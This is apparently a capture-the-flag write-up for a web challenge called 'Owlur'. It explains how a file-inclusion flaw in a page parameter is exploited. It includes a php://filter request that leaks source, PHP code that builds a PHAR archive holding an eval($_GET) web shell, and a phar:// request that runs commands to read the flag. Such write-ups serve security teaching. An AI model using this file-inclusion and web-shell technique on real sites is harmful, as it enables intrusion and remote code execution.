## Owlur - Web 200 problem

We are given an image hosting service where we can upload our own files. We notice that the pages are accessed through a `page` parameter to `index.php`, which may point to a file inclusion vuln.

Using a `php://` URL for the `page` confirms our suspicions:

    http://54.65.205.135/owlur/index.php?page=php://filter/convert.base64-encode/resource=./upload

We can use this to download source for all the pages. Notice that the script is appending `.php` to the path automatically (can confirm this by noting that e.g. [`upload.php`](http://54.65.205.135/owlur/upload.php) exists in the root).

Null bytes aren't working to suppress this appending, and `http` and `ftp` URLs are banned, so we have to try including a local file. We can upload `.jpg`s but those have the wrong extension.

We browse the [list of accepted protocols](http://php.net/manual/en/wrappers.php) and see a weird one called `phar`. The documentation even notes that

>  The phar stream wrapper does not operate on remote files, and cannot operate on remote files, and so is allowed even when the `allow_url_fopen` and `allow_url_include` INI options are disabled. 

Great! So if we construct a PHAR file which contains our shellcode, and rename it to `jpg` then we get remote code execution.

From here it's easy to build the PHAR:

    <?php
    $context = stream_context_create(array('phar' => array('compress' => Phar::GZ)));
    file_put_contents('phar://test.phar/z.php', '<'.'?php
        eval($_GET["code"]);
    ?'.'>', 0, $context);
    ?>

and then run it:

    http://54.65.205.135/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/bznAQAd.jpg/z&code=echo%20file_get_contents%28%27/OWLUR-FLAG.txt%27%29;

(Note that the `owlur-upload-zzzzzz` path was obtained by reading the `upload.php` source we exfiltrated).
